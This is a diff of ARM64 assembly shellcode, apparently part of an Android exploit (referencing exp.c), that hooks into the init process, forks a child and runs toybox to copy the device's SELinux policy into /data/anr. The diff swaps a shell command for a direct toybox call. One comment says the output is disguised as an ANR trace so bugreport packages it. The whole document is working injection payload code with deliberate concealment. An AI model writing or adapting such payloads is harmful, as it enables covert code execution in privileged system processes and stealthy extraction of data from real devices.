@@ -14,13 +14,17 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-sh_path:
-    .asciz "/system/bin/sh"
-sh_flag:
-    .asciz "-c"
-sh_cmd:
-    .asciz "mkdir -p /data/anr && cp /sys/fs/selinux/policy /data/anr/anr_dump_policy.txt"
-    .balign 8
+
+toybox_path:
+    .asciz "/system/bin/toybox"
+cmd_cp:
+    .asciz "cp"
+policy_src:
+    .asciz "/sys/fs/selinux/policy"
+// 注意：这里伪装成 ANR 的日志文件，方便被 bugreport 打包
+policy_dst:
+    .asciz "/data/anr/anr_policy_trace.txt" 
+    .balign 4
 
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
@@ -29,7 +33,7 @@ libcxx_ko_target_off:
     .align 4
 
 libcxx_start:
-    // 现场保护：保存所有可能被破坏的寄存器
+    // 现场保护 (8个 stp + 1个 str = 9 * 16 = 144 字节)
     stp x0, x1, [sp, #-16]!
     stp x2, x3, [sp, #-16]!
     stp x4, x5, [sp, #-16]!
@@ -44,29 +48,29 @@ libcxx_start:
     svc     0
     cbnz    w0, return
 
-    // 2. 检查 tid == 1 (确保在 init 主线程)
+    // 2. 检查 tid == 1
     mov     x8, SYS_gettid
     svc     0
     cmp     w0, 1
     bne     return
 
-    // 3. 创建互斥锁 /dev/df (防止并发重入)
+    // 3. 创建互斥锁 /dev/df
     mov     x0, -100
     adr     x1, mutex_file
     movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
     mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
-    tbnz    w0, #31, return // 如果已存在，直接返回
+
+    tbnz    w0, #31, return
 
     sub     sp, sp, 16
 
-    // 4. 准备 clone 的参数
+    // 4. clone 子进程
     mov     x8, SYS_gettid
     svc     0
     str     w0, [sp, 8]
 
-    // 5. clone 子进程 (类似 fork)
     mov     x8, SYS_clone
     add     x4, sp, 8
     mov     x3, xzr
@@ -77,50 +81,52 @@ libcxx_start:
     str     w0, [sp, 8]
     add     sp, sp, 16
 
-    // 父进程 (init) 返回，恢复现场
     cbnz    w0, return          
 
 worker:
-    // 6. 先在子进程中删除 /dev/df，方便下次测试
-    mov     x0, -100
-    adr     x1, mutex_file
-    mov     x8, #SYS_unlinkat
-    svc     0
-
-    // 7. 分配 64 字节栈空间用于构造 argv 数组
+    // 分配 64 字节栈空间存放 argv (5个指针 = 40字节，16字节对齐)
     sub     sp, sp, 64
 
-    // 构造 argv: ["/system/bin/sh", "-c", "mkdir -p ... && cp ...", NULL]
-    adr     x1, sh_path
+    // 5. 构造 argv: ["/system/bin/toybox", "cp", "src", "dst", NULL]
+    adr     x1, toybox_path
     str     x1, [sp, 0]
     
-    adr     x1, sh_flag
+    adr     x1, cmd_cp
     str     x1, [sp, 8]
     
-    adr     x1, sh_cmd
+    adr     x1, policy_src
     str     x1, [sp, 16]
     
-    str     xzr, [sp, 24] // NULL 结尾
+    adr     x1, policy_dst
+    str     x1, [sp, 24]
+    
+    str     xzr, [sp, 32] // NULL 结尾
 
-    // 8. execve("/system/bin/sh", argv, NULL)
-    adr     x0, sh_path
+    // 6. execve("/system/bin/toybox", argv, NULL)
+    adr     x0, toybox_path
     mov     x1, sp
     mov     x2, xzr
     mov     x8, #SYS_execve
     svc     0
 
-    // 如果 execve 失败，恢复栈并退出
+    // execve 失败则恢复栈并清理
     add     sp, sp, 64
-    b       myexit
+    b       cleanup_df
+
+cleanup_df:
+    // 强制删除 /dev/df (保证下次能跑)
+    mov     x0, -100
+    adr     x1, mutex_file
+    mov     x8, #SYS_unlinkat
+    svc     0
 
 myexit:
-    // 子进程安全退出
     mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
 
 return:
-    // 现场恢复（与开头严格对应，绝对不让 init 炸）
+    // 现场恢复
     ldr x30, [sp], #16
     ldp x28, x29, [sp], #16
     ldp x26, x27, [sp], #16
@@ -131,7 +137,7 @@ return:
     ldp x0, x1, [sp], #16
 
 libcxx_first_inst_copy:
-    // 原指令，exp.c 会把末尾的 b end 替换为 jmpback
+    // 原函数第一条指令，防止 exp.c 的 jmpback 导致崩溃
     stp     x29, x30, [sp, #-32]!
     b       end
 end:
